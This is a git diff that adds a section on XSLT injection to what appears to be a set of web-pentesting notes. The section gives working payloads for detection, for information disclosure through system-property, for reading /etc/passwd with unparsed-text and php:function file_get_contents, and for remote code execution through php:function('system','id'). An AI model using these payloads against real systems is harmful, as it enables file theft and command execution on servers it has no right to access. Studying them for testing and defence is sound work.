@@ -191,4 +191,37 @@ Here are all fruits of medium size ordered by their color:
 
 
 ## Identifying XLST Injection
-If anything provided in the text fields is reflected on the web page itself, we can simply check out XLST
+If anything provided in the text fields is reflected on the web page itself, we can simply check out XSLT injection by just providing a broken XML Tag i.e. `<`.
+
+**Information Disclosure :** 
+```
+Version: <xsl:value-of select="system-property('xsl:version')" />
+<br/>
+Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+<br/>
+Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+<br/>
+Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
+<br/>
+Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
+```
+ > Since the web application interpreted the XSLT elements we provided, this confirms an XSLT injection vulnerability. Furthermore, we can deduce that the web application seems to rely on the `libxslt` library and supports XSLT version `1.0`.
+ 
+ **Local File Inclusion :**
+ ```xml
+<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
+```
+This injection usually errors out if the function`unparse-text` is not supported.
+
+```xml
+<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+```
+This injection can show the file contents if the XSLT Library is configured to support PHP functions.
+
+**Remote Code Execution(RCE) : **
+```xml
+<xsl:value-of select="php:function('system','id')" />
+```
+
+This command if used to obtain RCE and we can add our command in place of `id` because the PHP function `system` helps to execute the command.
+
